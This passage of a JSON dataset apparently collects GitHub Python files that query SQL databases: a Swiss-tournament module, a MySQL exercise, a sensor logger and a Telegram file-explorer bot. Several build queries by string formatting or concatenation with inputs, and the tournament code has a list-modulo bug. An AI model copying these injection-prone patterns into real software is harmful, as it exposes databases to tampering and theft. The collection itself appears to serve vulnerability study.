name1: the first player's name\n        id2: the second player's unique id\n        name2: the second player's name\n    \"\"\"\n    # fetch data\n    records = fetchall(\"select * from player_static_view order by wins desc\")\n\n    # split data into pairs\n    count = 0\n    length = len(records)\n    pairs = []\n    while count < length:\n        pairs.append((\n            records[count][0],\n            records[count][1],\n            records[count+1][0],\n            records[count+1][1],\n        ))\n        count += 2\n    return pairs\n\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/bryancresswell/tournamentResults/blob/16e56d3136d03eca5351a49d5cda9821139825d2",
        "file_path": "/tournament.py",
        "source": "#!/usr/bin/env python\n# \n# tournament.py -- implementation of a Swiss-system tournament\n#\n\nimport psycopg2\nimport re\n\n\ndef connect():\n    \"\"\"Connect to the PostgreSQL database.  Returns a database connection.\"\"\"\n    return psycopg2.connect(\"dbname=tournament\")\n\n\ndef deleteMatches():\n    \"\"\"Remove all the match records from the database.\"\"\"\n    conn = connect()\n    c = conn.cursor()\n    table = \"matches\"\n    playerTable = \"players\"\n    c.execute(\"DELETE FROM %s;\" % (table,))\n    # UPDATE statement is to reset all values to default after deleting all\n    # rows from matches table\n    c.execute(\"\"\"UPDATE %s SET wins = 0, \n        loss = 0, matchesPlayed = 0\"\"\" % (playerTable,))\n    conn.commit()\n    conn.close()\n\ndef deletePlayers():\n    \"\"\"Remove all the player records from the database.\"\"\"\n    conn = connect()\n    table = \"players\"\n    c = conn.cursor()\n    c.execute(\"DELETE FROM %s;\" % (table,))\n    conn.commit()\n    conn.close()\n\ndef countPlayers():\n    \"\"\"Returns the number of players currently registered.\"\"\"\n    conn = connect()\n    table = \"players\"\n    c = conn.cursor()\n    c.execute(\"SELECT COUNT(playerID) FROM %s;\" % (table,))\n    result = c.fetchone()[0]\n    conn.commit()\n    conn.close()\n    return result\n\ndef registerPlayer(name):                                                                   \n    \"\"\"Adds a player to the tournament database.                                            \n    The database assigns a unique serial id number for the player.  (This                   \n    should be handled by your SQL database schema, not in your Python code.)                \n                                                                                            \n    Args:                                                                                   \n      name: the player's full name (need not be unique).                                    \n    \"\"\"                                                                                     \n    conn = connect()                                                                        \n    c = conn.cursor()                                                                       \n    # Regex is used here for instances where we might have apostrophes in one's             \n    # name                                                                                  \n    c.execute(\"INSERT INTO players (playerName) VALUES ('{}')\".format(                      \n        re.sub(r'\\'', '', name)));                                                          \n    conn.commit()                                                                           \n    conn.close()                                                                            \n                                                                                            \ndef playerStandings():                                                                      \n    \"\"\"Returns a list of the players and their win records, sorted by wins.                 \n                                                                                            \n    The first entry in the list should be the player in first place, or a player            \n    tied for first place if there is currently a tie.                                       \n                                                                                            \n    Returns:                                                                                \n      A list of tuples, each of which contains (id, name, wins, matches):                   \n        id: the player's unique id (assigned by the database)                               \n        name: the player's full name (as registered)                                        \n        wins: the number of matches the player has won                                      \n        matches: the number of matches the player has played                                \n    \"\"\"                                                                                     \n    conn = connect()                                                                        \n    c = conn.cursor()                                                                       \n    table = \"players\"                                                                       \n    c.execute(\"\"\"SELECT playerID,                                                           \n        playerName,                                                                         \n        wins,                                                                               \n        matchesPlayed FROM %s ORDER BY wins DESC;\"\"\" % (table,))                            \n    result = c.fetchall()                                                                   \n    conn.commit()                                                                           \n    conn.close()                                                                            \n    return result                                                                           \n                                                                                            \ndef reportMatch(winner, loser):                                                             \n    \"\"\"Records the outcome of a single match between two players.                           \n                                                                                            \n    Args:                                                                                   \n      winner:  the id number of the player who won                                          \n      loser:  the id number of the player who lost                                          \n    \"\"\"                                                                                     \n    conn = connect()                                                                        \n    c = conn.cursor()                                                                       \n    # Inserts a row into the matches table, and updates subsequent data                     \n    c.execute(\"\"\"INSERT INTO matches (winner, loser)                                        \n        VALUES ('%i', '%i')\"\"\" % (winner, loser))                                           \n    c.execute(\"\"\"UPDATE players SET wins = wins + 1,                                        \n        matchesPlayed = matchesPlayed + 1                                                   \n        WHERE playerID = %s\"\"\" % (winner,))                                                 \n    c.execute(\"\"\"UPDATE players SET loss = loss + 1,                                        \n        matchesPlayed = matchesPlayed + 1                                                   \n        WHERE playerID = %s\"\"\" % (loser,))                                                  \n    conn.commit()                                                                           \n    conn.close()                                                                            \n                                                                                            \ndef swissPairings():                                                                        \n    \"\"\"Returns a list of pairs of players for the next round of a match.                    \n                                                                                            \n    Assuming that there are an even number of players registered, each player               \n    appears exactly once in the pairings.  Each player is paired with another               \n    player with an equal or nearly-equal win record, that is, a player adjacent             \n    to him or her in the standings.                                                         \n                                                                                            \n    Returns:                                                                                \n      A list of tuples, each of which contains (id1, name1, id2, name2)                     \n        id1: the first player's unique id                                                   \n        name1: the first player's name                                                      \n        id2: the second player's unique id                                                  \n        name2: the second player's name                                                     \n    \"\"\"                                                                                     \n    conn = connect()                                                                        \n    c = conn.cursor()                                                                       \n    table = \"players\"                                                                       \n    c.execute(\"\"\"SELECT playerID,                                                           \n        playerName FROM %s ORDER BY wins DESC;\"\"\" % (table,))                               \n    result = c.fetchall()\n    pairings = list()\n    if (result % 2 != 0):\n        return None\n    else:                                                                   \n    # For loop to simply pair up adjacent players based on                                  \n    # already sorted value from the playerStandings() method                                \n        for i in range(0, len(result), 2):                                                      \n            tmpList = result[i:i+2]                                                             \n            temp1 = tmpList[0]                                                                  \n            temp2 = tmpList[1]                                                                  \n            pairings.append((temp1[0], temp1[1], temp2[0], temp2[1]))                           \n        return pairings   \n    return None ",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/johncoleman83/holbertonschool-higher_level_programming/blob/5bba1e4b37aa6d2bd97e0737e7bfe2fef93ae95b",
        "file_path": "/0x0F-python-object_relational_mapping/1-filter_states.py",
        "source": "#!/usr/bin/python3\n\"\"\"\n1-filter_states.py\n\"\"\"\nimport MySQLdb\nimport sys\n\n\ndef init_db():\n    \"\"\"initializes a db with MySQLdb\"\"\"\n    db = MySQLdb.connect(host='localhost',\n                         port=3306,\n                         user=sys.argv[1],\n                         passwd=sys.argv[2],\n                         db=sys.argv[3])\n    return db\n\n\ndef print_states_N(db):\n    \"\"\"prints all states with first initial 'N' from input DB\"\"\"\n    cur = db.cursor()\n    cur.execute(\"SELECT * FROM states \"\n                \"WHERE name LIKE BINARY 'N%' \"\n                \"ORDER BY states.id ASC\")\n    rows = cur.fetchall()\n    for row in rows:\n        print(row)\n    cur.close()\n    db.close()\n\n\nif __name__ == \"__main__\":\n    print_states_N(init_db())\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ad3ller/emonitor/blob/ae37f7eb3c4a26fc5316bdce84c4b53fea4a476a",
        "file_path": "/emonitor/devices/fake.py",
        "source": "# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Mon Jan  1 21:38:13 2018\n\n@author: Adam\n\"\"\"\nimport time\nfrom random import random, gauss\nfrom .base import Device\n\n\nclass Fake(Device):\n    \"\"\" simulate comms. with a serial device\"\"\"\n    def __init__(self, settings, debug=False):\n        self.settings = settings\n        self.sensors = settings[\"sensors\"]\n\n    def read_data(self, sensors=None):\n        \"\"\" return fake sensor data \"\"\"\n        if sensors is None:\n            sensors = self.sensors\n        for i, _ in enumerate(sensors):\n            try:\n                if random() < 0.01:\n                    raise Exception(\"Fake error\")\n                value = gauss(293 + 0.5*i, 0.1)\n                yield f\"{value:.4f}\"\n            except:\n                yield \"NULL\"\n\n    def close(self):\n        pass\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ad3ller/emonitor/blob/ae37f7eb3c4a26fc5316bdce84c4b53fea4a476a",
        "file_path": "/emonitor/devices/generic.py",
        "source": "# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Mon Jan  1 21:38:13 2018\n\n@author: Adam\n\"\"\"\nimport codecs\nimport re\nimport time\nimport warnings\nfrom serial import SerialException, Serial\nfrom .tools import get_serial_settings\nfrom .base import Device\n\n\nclass Generic(Serial, Device):\n    \"\"\" communication with a serial device \"\"\"\n    def __init__(self, settings, debug=False):\n        self.settings = settings\n        self.serial_settings = get_serial_settings(settings)\n        self.sensors = settings.get(\"sensors\", None)\n        self.cmd = codecs.decode(self.settings[\"cmd\"], \"unicode-escape\")\n        self.regex = settings.get(\"regex\", None)\n        # initialise Serial class\n        self.debug = debug\n        if self.debug:\n            print(\"serial settings:\", self.serial_settings)\n        super().__init__(**self.serial_settings)\n\n    def read_data(self, sensors=None, reset_wait=60):\n        \"\"\" read sensor data \"\"\"\n        # check connection and flush buffer\n        if sensors is None:\n            sensors = self.sensors\n        if self.debug:\n            print(\"sensors:\", sensors)\n        # reset connection if not open\n        while not self.is_open:\n            try:\n                self.open()\n            except SerialException:\n                time.sleep(reset_wait)\n        # query instrument\n        self.flush()\n        for sen in sensors:\n            try:\n                self.flushInput()\n                # parse command\n                serial_cmd = self.cmd.replace(\"{sensor}\", sen)\n                serial_cmd = bytes(serial_cmd, \"utf8\")\n                if self.debug:\n                    print(\"serial cmd:\", serial_cmd)\n                # write command, read response\n                self.write(serial_cmd)\n                # wait for acknowledgement / send enquiry\n                if \"ack\" in self.settings and \"enq\" in self.settings:\n                    # needed for maxigauge\n                    ack = codecs.decode(self.settings[\"ack\"], \"unicode-escape\")\n                    response = self.readline()\n                    if self.debug:\n                        print(\"acknowledgement:\", response, bytes(ack, \"utf8\"))\n                    if response == bytes(ack, \"utf8\"):\n                        # send enquiry\n                        enq = codecs.decode(self.settings[\"enq\"], \"unicode-escape\")\n                        self.write(bytes(enq, \"utf8\"))\n                    else:\n                        raise SerialException(\"Acknowledgement failed\")\n                response = self.readline()\n                if self.debug:\n                    print(response)\n                # format response\n                response = response.strip().decode(\"utf-8\")\n                if self.regex is not None:\n                    match = re.search(self.regex, response)\n                    response = match.group(1)\n                yield response\n            except:\n                yield \"NULL\"\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ad3ller/emonitor/blob/ae37f7eb3c4a26fc5316bdce84c4b53fea4a476a",
        "file_path": "/emonitor/run.py",
        "source": "# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Sat Dec 23 13:43:09 2017\n\n@author: Adam\n\"\"\"\nimport sys\nimport os\nimport time\nimport warnings\nimport getpass\nimport sqlite3\nfrom importlib import import_module\nimport pymysql\nfrom cryptography.fernet import Fernet\nfrom .core import (TABLE,\n                   DATA_DIRE,\n                   KEY_FILE)\nfrom .tools import (db_check,\n                    db_insert,\n                    parse_settings)\n\n\ndef get_columns(settings):\n    \"\"\" get columns from sensor names \"\"\"\n    sensors = settings[\"sensors\"]\n    if \"column_fmt\" in settings:\n        column_fmt = settings[\"column_fmt\"]\n        columns = (\"TIMESTAMP\",) \\\n                  + tuple([column_fmt.replace(\"{sensor}\", str(sen).strip()) for sen in sensors])\n    else:\n        columns = (\"TIMESTAMP\",) \\\n                  + tuple([str(sen).strip() for sen in sensors])\n    return columns\n\ndef get_device(settings, instrum, debug=False):\n    \"\"\" get instance of device_class \"\"\"\n    if \"device_class\" in settings:\n        device_class = settings[\"device_class\"]\n    else:\n        if instrum in [\"simulate\", \"fake\"]:\n            device_class = \"fake.Fake\"\n        else:\n            device_class = \"generic.Generic\"\n    # serial connection\n    mod, obj = device_class.split(\".\")\n    module = import_module(\"..devices.\" + mod, __name__)\n    return getattr(module, obj)(settings, debug=debug)\n\ndef get_sqlite(settings, columns):\n    \"\"\" get sqlite connection \"\"\"\n    assert \"db\" in settings, \"`db` not set in config\"\n    name = settings[\"db\"]\n    fname, _ = os.path.splitext(name)\n    fname += \".db\"\n    fil = os.path.join(DATA_DIRE, fname)\n    if not os.path.isfile(fil):\n        raise OSError(f\"{fname} does not exists.  Use generate or create.\")\n    db = sqlite3.connect(fil)\n    db_check(db, TABLE, columns)\n    return db\n\ndef get_sql(settings):\n    \"\"\" get connection to sql database \"\"\"\n    assert \"sql_host\" in settings, \"sql_host not set in config\"\n    assert \"sql_port\" in settings, \"sql_port not set in config\"\n    assert \"sql_db\" in settings, \"sql_db not set in config\"\n    assert \"sql_table\" in settings, \"sql_table not set in config\"\n    if \"sql_user\" not in settings:\n        settings[\"sql_user\"] = input(\"SQL username: \")\n    else:\n        print(f\"SQL username: {settings['sql_user']}\")\n    if \"sql_passwd\" not in settings:\n        prompt = f\"Enter password: \"\n        sql_passwd = getpass.getpass(prompt=prompt, stream=sys.stderr)\n    else:\n        # decrypt password\n        assert os.path.isfile(KEY_FILE), f\"{KEY_FILE} not found.  Create using passwd.\"\n        with open(KEY_FILE, \"rb\") as fil:\n            key = fil.readline()\n        fern = Fernet(key)\n        sql_passwd = fern.decrypt(bytes(settings[\"sql_passwd\"], \"utf8\")).decode(\"utf8\")\n    # connect\n    sql_conn = pymysql.connect(host=settings[\"sql_host\"],\n                               port=int(settings[\"sql_port\"]),\n                               user=settings[\"sql_user\"],\n                               password=sql_passwd,\n                               database=settings[\"sql_db\"])\n    return sql_conn\n\ndef run(config, instrum, wait,\n        output=False, sql=False, header=True, quiet=False, debug=False):\n    \"\"\" start the emonitor server and output to sqlite database.\n    \"\"\"\n    tty = sys.stdout.isatty()\n    settings = parse_settings(config, instrum)\n    columns = get_columns(settings)\n    if debug and tty:\n        print(\"DEBUG enabled\")\n    try:\n        device = get_device(settings, instrum, debug=debug)\n        # sqlite output\n        db = None\n        if output:\n            db = get_sqlite(settings, columns)\n        # sql output\n        sql_conn = None\n        if sql:\n            sql_conn = get_sql(settings)\n        # header\n        if tty:\n            if not quiet:\n                print(\"Starting emonitor. Use Ctrl-C to stop. \\n\")\n                if header:\n                    test = tuple(device.read_data())\n                    if debug:\n                        print(test)\n                    str_width = len(str(test[0]))\n                    print(columns[0].rjust(19) + \" \\t\",\n                          \"\\t \".join([col.rjust(str_width) for col in columns[1:]]))\n        elif header:\n            print(\",\".join(columns))\n        # start server\n        while True:\n            ## read data\n            values = tuple(device.read_data())\n            is_null = all([isinstance(v, str) and v.upper() == \"NULL\" for v in values])\n            ## output\n            if not is_null:\n                values = (time.strftime(\"%Y-%m-%d %H:%M:%S\"), ) + values\n                if tty:\n                    if not quiet:\n                        print(\"\\t \".join(values))\n                else:\n                    print(\",\".join(values))\n                if output:\n                    db_insert(db, TABLE, columns, values, debug=debug)\n                if sql:\n                    try:\n                        if not sql_conn.open:\n                            # attempt to reconnect\n                            sql_conn.connect()\n                        db_insert(sql_conn, settings[\"sql_table\"], columns, values, debug=debug)\n                    except:\n                        warnings.warn(\"SQL connection failed\")\n            time.sleep(wait)\n    except KeyboardInterrupt:\n        if tty and not quiet:\n            print(\"\\nStopping emonitor.\")\n    finally:\n        device.close()\n        if db is not None:\n            db.close()\n        if sql_conn is not None:\n            sql_conn.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ad3ller/emonitor/blob/ae37f7eb3c4a26fc5316bdce84c4b53fea4a476a",
        "file_path": "/emonitor/tools.py",
        "source": "# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Sun Jan 14 21:55:57 2018\n\n@author: adam\n\"\"\"\nimport os\nimport warnings\nimport sqlite3\nimport datetime\nfrom collections.abc import Iterable\nfrom ast import literal_eval\nimport numpy as np\nimport pandas as pd\nfrom .core import DATA_DIRE\n\nclass CausalityError(ValueError):\n    \"\"\" `There was an accident with a contraceptive and a time machine.`\n    \"\"\"\n    pass\n\n\ndef db_path(name):\n    \"\"\" Get path of sqlite file for 'name'.\n    \"\"\"\n    fil = os.path.join(DATA_DIRE, name + '.db')\n    return fil\n\n\ndef db_init(conn, table, columns, debug=False):\n    \"\"\" initialize sqlite database\n    \"\"\"\n    column_str = \", \".join(['`' + str(c) + '` DOUBLE DEFAULT NULL' for c in columns])\n    sql = f\"CREATE TABLE {table}(`TIMESTAMP` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP, {column_str});\"\n    if debug:\n        print(sql)\n    cursor = conn.cursor()\n    cursor.execute(sql)\n    cursor.close()\n\n\ndef db_check(conn, table, columns, debug=False):\n    \"\"\" check sqlite database\n    \"\"\"\n    sql = f\"SELECT * FROM {table};\"\n    if debug:\n        print(sql)\n    cursor = conn.cursor()\n    cursor.execute(sql)\n    db_columns = list(next(zip(*cursor.description)))\n    for col in columns:\n        if col not in db_columns:\n            cursor.close()\n            conn.close()\n            raise NameError(f\"columnn `{col}` not in sqlite database\")\n    cursor.close()\n\n\ndef db_count(conn, table, debug=False):\n    \"\"\" count rows in sqlite table\n    \"\"\"\n    sql = f\"SELECT COUNT(*) as count FROM {table};\"\n    if debug:\n        print(sql)\n    cursor = conn.cursor()\n    num_rows = cursor.execute(sql).fetchone()[0]\n    cursor.close()\n    return num_rows\n\n\ndef db_describe(conn, table, debug=False):\n    \"\"\" get sqlite database structure\n    \"\"\"\n    sql = f\"PRAGMA table_info({table});\"\n    if debug:\n        print(sql)\n    cursor = conn.cursor()\n    info = cursor.execute(sql).fetchall()\n    cursor.close()\n    return info\n\n\ndef db_insert(conn, table, columns, values, debug=False):\n    \"\"\" INSERT INTO {table} {columns} VALUES {values};\n    \"\"\"\n    col_str = str(columns).replace(\"'\", \"`\")\n    sql = f\"INSERT INTO {table} {col_str} VALUES {values};\"\n    if debug:\n        print(sql)\n    cursor = conn.cursor()\n    cursor.execute(sql)\n    conn.commit()\n\n\ndef history(conn, start, end, **kwargs):\n    \"\"\" SELECT * FROM table WHERE tcol BETWEEN start AND end.\n\n        If start and end are more than 24 hours apart, then a random\n        sample of length specified by 'limit' is returned, unless\n        'full_resolution' is set to True.\n\n        args:\n            conn          database connection           object\n            start         query start time              datetime.datetime / tuple / dict\n            end           query end time                datetime.datetime / tuple / dict\n\n        kwargs:\n            table='data'             name of table in database        str\n            limit=6000               max number of rows               int\n            tcol='TIMESTAMP'         timestamp column name            str\n            full_resolution=False    No limit - return everything     bool\n            coerce_float=False       convert, e.g., decimal to float  bool\n            dropna=True              drop NULL columns                bool\n            debug=False              print SQL query                  bool\n        return:\n            result       pandas.DataFrame\n    \"\"\"\n    # read kwargs\n    table = kwargs.get('table', 'data')\n    limit = kwargs.get('limit', 6000)\n    tcol = kwargs.get('tcol', 'TIMESTAMP')\n    full_resolution = kwargs.get('full_resolution', False)\n    coerce_float = kwargs.get('coerce_float', False)\n    dropna = kwargs.get('dropna', True)\n    debug = kwargs.get('debug', False)\n    # start\n    if isinstance(start, datetime.datetime):\n        pass\n    elif isinstance(start, tuple):\n        start = datetime.datetime(*start)\n    elif isinstance(start, dict):\n        start = datetime.datetime(**start)\n    else:\n        raise TypeError(\"type(start) must be in [datetime.dateime, tuple, dict].\")\n    # end\n    if isinstance(end, datetime.datetime):\n        pass\n    elif isinstance(end, tuple):\n        end = datetime.datetime(*end)\n    elif isinstance(start, dict):\n        end = datetime.datetime(**end)\n    else:\n        raise TypeError(\"type(end) must be in [datetime.dateime, tuple, dict].\")\n    # check times\n    if end < start:\n        raise CausalityError('end before start')\n    # connection type\n    if isinstance(conn, sqlite3.Connection):\n        rand = \"RANDOM()\"\n    else:\n        rand = \"RAND()\"\n    # SQL query\n    if full_resolution or limit is None:\n        reorder = False\n        sql = f\"SELECT * FROM `{table}` WHERE `{tcol}` BETWEEN '{start}' AND '{end}';\"\n    # check start and end are on the same day\n    elif end - datetime.timedelta(days=1) < start:\n        reorder = False\n        sql = f\"SELECT * FROM `{table}` WHERE `{tcol}` BETWEEN '{start}' AND '{end}' LIMIT {limit};\"\n    else:\n        # if time span is more than 1 day randomly sample measurements from range\n        reorder = True\n        sql = f\"SELECT * FROM `{table}` WHERE `{tcol}` BETWEEN '{start}' AND '{end}' ORDER BY {rand} LIMIT {limit};\"\n    if debug:\n        print(sql)\n    result = pd.read_sql_query(sql, conn, coerce_float=coerce_float, parse_dates=[tcol])\n    if len(result.index) > 0:\n        result.replace(\"NULL\", np.nan, inplace=True)\n        if dropna:\n            # remove empty columns\n            result = result.dropna(axis=1, how='all')\n        if reorder:\n            # sort data by timestamp\n            result = result.sort_values(by=tcol)\n        result = result.set_index(tcol)\n    return result\n\n\ndef live(conn, delta=None, **kwargs):\n    \"\"\" SELECT * FROM table WHERE tcol BETWEEN (time.now() - delta) AND time.now().\n\n        If delta is more than 24 hours then a random sample of length specified\n        by 'limit' is returned, unless 'full_resolution' is set to True.\n\n        args:\n            conn          database connection           object\n            delta         query start time              datetime.timedelta / dict\n\n        kwargs:\n            table='data'             name of table in database        str\n            limit=6000               max number of rows               int\n            tcol='TIMESTAMP'         timestamp column name            str\n            full_resolution=False    No limit - return everything     bool\n            coerce_float=True        convert, e.g., decimal to float  bool\n            dropna=True              drop NULL columns                bool\n            debug=False              print SQL query                  bool\n        return:\n            result       pandas.DataFrame\n\n    \"\"\"\n    if delta is None:\n        delta = {\"hours\" : 4}\n    if isinstance(delta, datetime.timedelta):\n        pass\n    elif isinstance(delta, dict):\n        delta = datetime.timedelta(**delta)\n    else:\n        raise TypeError(\"type(delta) must be in [datetime.timedelta, dict].\")\n    end = datetime.datetime.now()\n    start = end - delta\n    return history(conn, start, end, **kwargs)\n\n\ndef tquery(conn, start=None, end=None, **kwargs):\n    \"\"\" ------------------------------------------------------------\n        DeprecationWarning\n            Use history() or live() instead.\n        ------------------------------------------------------------\n\n        SELECT * FROM table WHERE tcol BETWEEN start AND end.\n\n        If start is None, it will be set to time.now() - delta [default:\n        4 hours], i.e., live mode.\n\n        If end is None, set to start + delta, i.e., to select a given time\n        window, specify either: start and end, or start and delta.\n\n        If start and end are more than 24 hours apart, then a random\n        sample of length specified by 'limit' is returned, unless\n        'full_resolution' is set to True.\n\n        args:\n            conn          database connection           object\n            start         query start time              datetime.datetime\n            end           query end time                datetime.datetime\n\n        kwargs:\n            delta=datetime.timedelta(hours=4)\n                                     time to look back in live mode   datetime.timedelta\n            table='data'             name of table in database        str\n            limit=6000               max number of rows               int\n            tcol='TIMESTAMP'         timestamp column name            str\n            full_resolution=False    No limit - return everything     bool\n            coerce_float=True        convert, e.g., decimal to float  bool\n            dropna=True              drop NULL columns                bool\n            debug=False              print SQL query                  bool\n        return:\n            result       pandas.DataFrame\n    \"\"\"\n    warnings.warn(\"tquery() is deprecated. Use history() or live() instead.\", DeprecationWarning)\n    # read kwargs\n    delta = kwargs.get('delta', datetime.timedelta(hours=4))\n    start, end = get_trange(start, end, delta)\n    result = history(conn, start, end, **kwargs)\n    return result\n\n\ndef get_trange(start, end, delta):\n    \"\"\" find start and end times from inputs\n    \"\"\"\n    if not isinstance(start, datetime.datetime) or not isinstance(end, datetime.datetime):\n        # start or end unspecified -> delta required\n        if not isinstance(delta, datetime.timedelta):\n            # check delta type\n            raise TypeError('delta must be of type datetime.timedelta')\n        # check whether start or end is missing\n        if not isinstance(start, datetime.datetime):\n            # start not specified, check end\n            if not isinstance(end, datetime.datetime):\n                # neither start nor end specified -> live mode\n                end = datetime.datetime.now()\n            # infer start from end and delta\n            start = end - delta\n        if not isinstance(end, datetime.datetime):\n            # infer end from start and delta\n            end = start + delta\n    # all good?\n    if end < start:\n        raise CausalityError('end before start')\n    return start, end\n\n\ndef format_commands(settings):\n    \"\"\" format string commands\n    \"\"\"\n    for key in ['cmd', 'ack', 'enq']:\n        if key in settings:\n            value = settings[key]\n            if isinstance(value, str):\n                # string replacements\n                for placeholder, replacement in [(\"$CR\", \"\\x0D\"),\n                                                 (\"$LF\", \"\\x0A\"),\n                                                 (\"$ACK\", \"\\x06\"),\n                                                 (\"$ENQ\", \"\\x05\")]:\n                    if placeholder in value:\n                        value = value.replace(placeholder, replacement)\n                settings[key] = value\n    return settings\n\n\ndef parse_settings(conf, instrum, ignore=None):\n    \"\"\" read config section and use ast.literal_eval() to get python dtypes\n    \"\"\"\n    settings = dict()\n    # keys to ignore\n    if ignore is None:\n        ignore = []\n    if not isinstance(ignore, Iterable):\n        ignore = [ignore]\n    # evaluate items\n    for key, value in conf.items(instrum):\n        if key in ignore:\n            settings[key] = value\n        else:\n            try:\n                settings[key] = literal_eval(value)\n            except:\n                settings[key] = value\n    return format_commands(settings)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/victor141516/FileXbot-telegram/blob/8c3621e071b49bf3c00021340a9314476631126f",
        "file_path": "/filex.py",
        "source": "import telebot\nimport sqlite3\n\nclass DbHandler(object):\n    def __init__(self, db_name):\n        super(DbHandler, self).__init__()\n        self.db_name = db_name\n\n    def __db_connect__(self):\n        self.db = sqlite3.connect(self.db_name)\n        self.db.row_factory = sqlite3.Row\n        self.cursor = self.db.cursor()\n\n    def __db_disconnect__(self):\n        self.db.close()\n\n    def insert(self, table, values, updater=None):\n        try:\n            self.__db_connect__()\n            if (not updater):\n                updater = values\n\n            updater_str = ', '.join([k + \"='\" + str(updater[k]) + \"'\" for k in updater.keys()])\n            values_str = ', '.join([\"'\" + str(values[k]) + \"'\" for k in values.keys()])\n            columns_str = ', '.join([\"'\" + str(k) + \"'\" for k in values.keys()])\n            where_str = 'AND '.join([k + \"='\" + str(updater[k]) + \"'\" for k in updater.keys()])\n            exists = len(self.cursor.execute(\"SELECT * FROM \" + table + \" WHERE (\" + where_str + \")\").fetchall())\n            if (exists):\n                values_str = ', '.join([k + \"='\" + str(values[k]) + \"'\" for k in values.keys()])\n                self.cursor.execute(\"UPDATE \" + table + \" SET \" + values_str + \" WHERE \" + where_str)\n                self.db.commit()\n                self.__db_disconnect__()\n                return True\n\n            self.cursor.execute(\"INSERT INTO \" + table + \"(\" + columns_str + \") VALUES (\" + values_str + \")\")\n            self.db.commit()\n            self.__db_disconnect__()\n            return True\n        except Exception as e:\n            raise (e)\n            self.__db_disconnect__()\n            return False\n\n    def select(self, table, where=None):\n        try:\n            self.__db_connect__()\n            if (where):\n                self.cursor.execute(\"SELECT * FROM \" + table + \" WHERE (\" + where + \")\")\n            else:\n                self.cursor.execute(\"SELECT * FROM \" + table)\n            data = self.cursor.fetchall()\n            self.__db_disconnect__()\n            return data\n        except Exception as e:\n            print (e)\n            self.__db_disconnect__()\n            return False\n\n    def delete(self, table, where=None):\n        try:\n            self.__db_connect__()\n            if (where):\n                self.cursor.execute(\"DELETE FROM \" + table + \" WHERE (\" + where + \")\")\n            else:\n                self.cursor.execute(\"DELETE FROM \" + table)\n            self.db.commit()\n            self.__db_disconnect__()\n            return True\n        except Exception as e:\n            print (e)\n            self.__db_disconnect__()\n            return False\nclass Explorer(object):\n    def __init__(self, telegram_id):\n        super(Explorer, self).__init__()\n        self.user_id = db.select('user', \"telegram_id = \" + str(telegram_id))[0]['id']\n        self.path = [db.select('directory', \"name = '/' AND parent_directory_id = 'NULL' AND user_id = \" + str(self.user_id))[0]['id']]\n        self.last_action_message_ids = []\n\n    def get_path_string(self):\n        if (len(self.path) == 1):\n            return '/'\n        directory_ids_string = ', '.join([str(each) for each in self.path])\n        directories = db.select('directory', \"id in (\" + directory_ids_string + \")\")\n        return '/'.join([directory['name'] for directory in directories])[1:]\n\n\n    def get_directory_content(self, directory_id=None):\n        if (not directory_id):\n            directory_id = self.path[-1:][0]\n        return {\n                'directories': db.select('directory', \"parent_directory_id = \" + str(directory_id) + \" AND user_id = \" + str(self.user_id)),\n                'files': db.select('file', \"directory_id = \" + str(directory_id) + \" AND user_id = \" + str(self.user_id))\n            }\n\n    def go_to_directory(self, directory_id):\n        directory_id = db.select('directory', \"id = \" + directory_id)[0]['id']\n        self.path.append(directory_id)\n\n    def go_to_parent_directory(self):\n        self.path = self.path[:-1]\n\n    def new_directory(self, directory_name, parent_directory_id=None):\n        if (not parent_directory_id):\n            parent_directory_id = self.path[-1:][0]\n        return db.insert('directory', {'name': directory_name, 'parent_directory_id': parent_directory_id, 'user_id': self.user_id})\n\n    def new_file(self, telegram_id, name, mime, size, directory_id=None):\n        if (not directory_id):\n            directory_id = self.path[-1:][0]\n        return db.insert('file', {'name': name, 'mime': mime, 'size': size, 'telegram_id': telegram_id, 'directory_id': directory_id, 'user_id': self.user_id})\n\n    def remove_files(self, file_ids):\n        file_ids_string = ', '.join([str(each) for each in file_ids])\n        db.delete('file', \"id in (\" + file_ids_string + \")\")\n\n    def remove_directories(self, directory_ids):\n        directory_ids_string = ', '.join([str(each) for each in directory_ids])\n        for directory_id in directory_ids:\n            content = self.get_directory_content(directory_id)\n            self.remove_files([each['id'] for each in content['files']])\n            self.remove_directories([each['id'] for each in content['directories']])\n        db.delete('directory', \"id in (\" + directory_ids_string + \")\")\n\n\ndb = DbHandler('filex.db')\nexplorers = {}\nAPI_TOKEN = ''\nbot = telebot.TeleBot(API_TOKEN)\nmime_conv = {'application/epub+zip' : 'D', 'application/java-archive' : 'D', 'application/javascript' : 'D', 'application/json' : 'D', 'application/msword' : 'D', 'application/octet-stream' : 'D', 'application/octet-stream' : 'D', 'application/ogg' : 'A', 'application/pdf' : 'D', 'application/rtf' : 'D', 'application/vnd.amazon.ebook' : 'D', 'application/vnd.apple.installer+xml' : 'D', 'application/vnd.mozilla.xul+xml' : 'D', 'application/vnd.ms-excel' : 'D', 'application/vnd.ms-powerpoint' : 'D', 'application/vnd.oasis.opendocument.presentation' : 'D', 'application/vnd.oasis.opendocument.spreadsheet' : 'D', 'application/vnd.oasis.opendocument.text' : 'D', 'application/vnd.visio' : 'D', 'application/x-abiword' : 'D', 'application/x-bzip' : 'D', 'application/x-bzip2' : 'D', 'application/x-csh' : 'D', 'application/x-rar-compressed' : 'D', 'application/x-sh' : 'D', 'application/x-shockwave-flash' : 'D', 'application/x-tar' : 'D', 'application/xhtml+xml' : 'D', 'application/xml' : 'D', 'application/zip' : 'D', 'audio/aac' : 'A', 'audio/midi' : 'A', 'audio/ogg' : 'A', 'audio/webm' : 'A', 'audio/x-wav' : 'A', 'font/ttf' : 'D', 'font/woff' : 'D', 'font/woff2' : 'D', 'image/gif' : 'P', 'image/jpeg' : 'P', 'image/svg+xml' : 'P', 'image/tiff' : 'P', 'image/webp' : 'P', 'image/x-icon' : 'P', 'text/calendar' : 